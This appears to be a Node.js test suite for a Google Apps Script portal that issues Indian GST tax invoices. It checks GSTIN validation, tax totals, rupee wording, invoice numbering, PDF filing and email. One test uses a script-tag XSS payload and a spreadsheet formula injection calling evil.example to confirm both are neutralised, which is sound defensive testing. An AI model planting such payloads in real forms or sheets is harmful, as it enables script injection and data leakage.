'use strict';

const test = require('node:test');
const assert = require('node:assert/strict');
const { createApp } = require('./gas-harness');

// A GSTIN with a correct check character, built independently of the app's code.
const CHARS = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ';
function gstin(base14) {
  let sum = 0;
  base14.split('').forEach((c, i) => {
    const p = CHARS.indexOf(c) * (i % 2 === 0 ? 1 : 2);
    sum += Math.floor(p / 36) + (p % 36);
  });
  return base14 + CHARS[(36 - (sum % 36)) % 36];
}
const WB_GSTIN = gstin('19AAAAA0000A1Z'); // West Bengal
const KA_GSTIN = gstin('29BBBBB1111B1Z'); // Karnataka

function lib() {
  return createApp().eval('invoiceLib_()');
}

function form(overrides) {
  return Object.assign({
    clientName: 'Acme Robotics Pvt Ltd',
    clientAddress: '4 Industrial Area, Bengaluru, Karnataka 560001',
    clientGstin: KA_GSTIN,
    clientEmail: '',
    invoiceDate: '2026-10-29',
    dueDays: '15',
    currency: 'INR',
    taxMode: 'inter',
    gstRate: '18',
    notes: '',
    items: [{ description: 'Image annotation', quantity: '1000', rate: '2.50', unit: 'images', sac: '' }],
  }, overrides);
}

function readyApp(config) {
  const app = createApp();
  app.eval("CONFIG.COMPANY_GSTIN = '" + WB_GSTIN + "'");
  (config || []).forEach((line) => app.eval(line));
  app.call('setup');
  return app;
}

function pdfsIn(app) {
  return app.filesIn('ROOT_FOLDER_ID').filter((f) => /\.pdf$/.test(f.name));
}

function rowFor(app, number) {
  const rows = app.sheetRows();
  const header = rows[0];
  const row = rows.find((r) => r[header.indexOf('Invoice No')] === number);
  return row && Object.fromEntries(header.map((name, i) => [name, row[i]]));
}

test('GSTIN check character catches typos', () => {
  const l = createApp().context.invoiceLib_();
  assert.equal(l.gstinValid(WB_GSTIN), true);
  assert.equal(l.gstinValid(WB_GSTIN.slice(0, 14) + (WB_GSTIN[14] === 'A' ? 'B' : 'A')), false);
  assert.equal(l.gstinValid('27AAPFU0939F1ZV'), true); // widely published sample
  assert.equal(l.gstinValid('99AAAAA0000A1Z5'), false);
});

test('totals: intra-state splits GST, rupee invoices are rounded to the rupee', () => {
  const l = createApp().context.invoiceLib_();
  const t = l.computeTotals([{ quantity: 3, rateMinor: 3333 }], 'intra', 18, 'INR'); // 99.99
  assert.equal(t.subtotal, 9999);
  assert.equal(t.tax, 1800); // 17.9982 -> 18.00
  assert.equal(t.cgst + t.sgst, t.tax);
  assert.equal(t.total % 100, 0);
  assert.equal(t.subtotal + t.tax + t.roundOff, t.total);
  const usd = l.computeTotals([{ quantity: 3, rateMinor: 3333 }], 'none', 18, 'USD');
  assert.equal(usd.tax, 0);
  assert.equal(usd.total, 9999);
});

test('amounts in words use lakh/crore for INR and millions for USD', () => {
  const l = createApp().context.invoiceLib_();
  assert.equal(l.amountInWords(118000, 'INR'), 'Indian Rupees One Thousand One Hundred Eighty Only');
  assert.equal(l.amountInWords(12345678900, 'INR'), 'Indian Rupees Twelve Crore Thirty-Four Lakh Fifty-Six Thousand Seven Hundred Eighty-Nine Only');
  assert.equal(l.amountInWords(10050, 'INR'), 'Indian Rupees One Hundred and Fifty Paise Only');
  assert.equal(l.amountInWords(0, 'INR'), 'Indian Rupees Zero Only');
  assert.equal(l.amountInWords(250000000, 'USD'), 'US Dollars Two Million Five Hundred Thousand Only');
  assert.equal(l.formatMoney(123456789, 'INR'), '12,34,567.89');
  assert.equal(l.formatMoney(123456789, 'USD'), '1,234,567.89');
});

test('financial year runs April to March', () => {
  const l = createApp().context.invoiceLib_();
  assert.equal(l.financialYear('2026-03-31'), '2025-26');
  assert.equal(l.financialYear('2026-04-01'), '2026-27');
  assert.equal(l.addDays('2026-12-25', 15), '2027-01-09');
  assert.equal(l.displayDate('2026-10-29'), '29 Oct 2026');
  assert.equal(l.parseIsoDate('2026-02-30'), null);
});

test('validation rejects bad input field by field', () => {
  const l = createApp().context.invoiceLib_();
  const bad = l.validateInvoice(form({
    clientName: 'A', clientGstin: '29BBBBB1111B1Z0', invoiceDate: '29/10/2026', dueDays: '400', currency: 'EUR', gstRate: '-1',
    items: [{ description: 'x', quantity: '0', rate: '1.234', sac: 'ab' }],
  }), WB_GSTIN);
  assert.equal(bad.ok, false);
  ['clientName', 'clientGstin', 'invoiceDate', 'dueDays', 'currency', 'gstRate', 'items'].forEach((f) => assert.ok(bad.errors[f], f));
  assert.deepEqual(Object.keys(bad.itemErrors[0]).sort(), ['description', 'quantity', 'rate', 'sac']);
  assert.equal(l.validateInvoice(form({ items: [] }), WB_GSTIN).ok, false);
});

test('GST type must match the client state, and needs a company GSTIN', () => {
  const l = createApp().context.invoiceLib_();
  assert.ok(l.validateInvoice(form({ taxMode: 'intra' }), WB_GSTIN).errors.taxMode);
  assert.ok(l.validateInvoice(form({ clientGstin: WB_GSTIN, taxMode: 'inter' }), WB_GSTIN).errors.taxMode);
  assert.equal(l.validateInvoice(form({ clientGstin: WB_GSTIN, taxMode: 'intra' }), WB_GSTIN).ok, true);
  assert.ok(l.validateInvoice(form(), '').errors.taxMode);
  assert.equal(l.validateInvoice(form({ taxMode: 'none' }), '').ok, true);
});

test('generateInvoice files a numbered PDF, logs it, and returns the download', () => {
  const app = readyApp();
  const r = app.call('generateInvoice', form());
  assert.equal(r.success, true, JSON.stringify(r));
  assert.equal(r.number, 'TAI/2026-27/0001');
  assert.equal(r.total, '2,950.00'); // 2500 + 450 IGST
  const pdf = Buffer.from(r.pdfBase64, 'base64').toString('utf8');
  assert.ok(pdf.startsWith('%PDF'));
  assert.match(pdf, /Tax Invoice/);
  assert.match(pdf, /IGST @ 18%/);
  assert.match(pdf, /Indian Rupees Two Thousand Nine Hundred Fifty Only/);
  assert.match(pdf, /Acme Robotics Pvt Ltd/);
  assert.equal(pdfsIn(app).length, 1);

  const row = rowFor(app, r.number);
  assert.equal(row.Client, 'Acme Robotics Pvt Ltd');
  assert.equal(row.Total, '2,950.00');
  assert.equal(row['Due Date'], '2026-11-13');
  assert.equal(row.Status, 'Issued');
});

test('numbers are sequential per financial year', () => {
  const app = readyApp();
  const n = (date) => app.call('generateInvoice', form({ invoiceDate: date })).number;
  assert.equal(n('2026-10-01'), 'TAI/2026-27/0001');
  assert.equal(n('2026-10-02'), 'TAI/2026-27/0002');
  assert.equal(n('2027-03-31'), 'TAI/2026-27/0003');
  assert.equal(n('2027-04-01'), 'TAI/2027-28/0001');
});

test('invoices without company GSTIN are plain invoices', () => {
  const app = createApp();
  app.call('setup');
  const r = app.call('generateInvoice', form({ taxMode: 'none', clientGstin: '' }));
  assert.equal(r.success, true, JSON.stringify(r));
  const pdf = Buffer.from(r.pdfBase64, 'base64').toString('utf8');
  assert.doesNotMatch(pdf, /Tax Invoice/);
  assert.doesNotMatch(pdf, /GST @|IGST|CGST/);
});

test('client text is HTML-escaped and formulas are defused in the register', () => {
  const app = readyApp();
  const r = app.call('generateInvoice', form({
    clientName: '<script>alert(1)</script> & Co',
    clientAddress: '=IMPORTXML("http://evil.example","//a") 12 Road, Kolkata',
  }));
  assert.equal(r.success, true, JSON.stringify(r));
  const pdf = Buffer.from(r.pdfBase64, 'base64').toString('utf8');
  assert.doesNotMatch(pdf, /<script>alert/);
  assert.match(pdf, /&lt;script&gt;alert\(1\)&lt;\/script&gt; &amp; Co/);
  assert.equal(app.sheetRows()[1][app.sheetRows()[0].indexOf('Client Address')].startsWith("'"), true);
});

test('access code blocks issuing when set', () => {
  const app = readyApp(["CONFIG.ACCESS_CODE = 's3cret'"]);
  const denied = app.call('generateInvoice', form());
  assert.equal(denied.success, false);
  assert.equal(denied.accessCodeInvalid, true);
  assert.equal(app.sheetRows().length, 1); // header only
  assert.equal(app.call('generateInvoice', form({ accessCode: 's3cret' })).success, true);
});

test('emails the client only when asked and an address is given', () => {
  const app = readyApp();
  assert.equal(app.call('generateInvoice', form({ clientEmail: 'ap@acme.example' })).emailed, false);
  const r = app.call('generateInvoice', form({ clientEmail: 'ap@acme.example', emailClient: true }));
  assert.equal(r.emailed, true);
  assert.equal(app.mail.length, 1);
  assert.equal(app.mail[0].to, 'ap@acme.example');
  assert.match(app.mail[0].subject, /TAI\/2026-27\/0002/);
});

test('invalid submissions are rejected before anything is filed', () => {
  const app = readyApp();
  const r = app.call('generateInvoice', form({ clientName: '' }));
  assert.equal(r.success, false);
  assert.ok(r.errors.clientName);
  assert.equal(pdfsIn(app).length, 0);
  assert.equal(app.call('generateInvoice', form()).number, 'TAI/2026-27/0001'); // no number burned
});

test('the portal page renders with the shared rules inlined', () => {
  const app = readyApp();
  const page = app.eval("HtmlService.createTemplateFromFile('Index').evaluate().getContent()");
  assert.match(page, /gstinValid/);
  assert.match(page, /generateInvoice/);
  assert.doesNotMatch(page, /id="accessCode"/);
  assert.match(app.eval("doGet().xFrameOptionsMode"), /ALLOWALL/);
  app.eval("CONFIG.ACCESS_CODE = 'x'");
  assert.match(app.eval("HtmlService.createTemplateFromFile('Index').evaluate().getContent()"), /id="accessCode"/);
});

test('previewInvoice saves a sample PDF', () => {
  const app = readyApp();
  app.call('previewInvoice');
  assert.equal(pdfsIn(app).length, 1);
  assert.match(pdfsIn(app)[0].name, /^PREVIEW/);
});
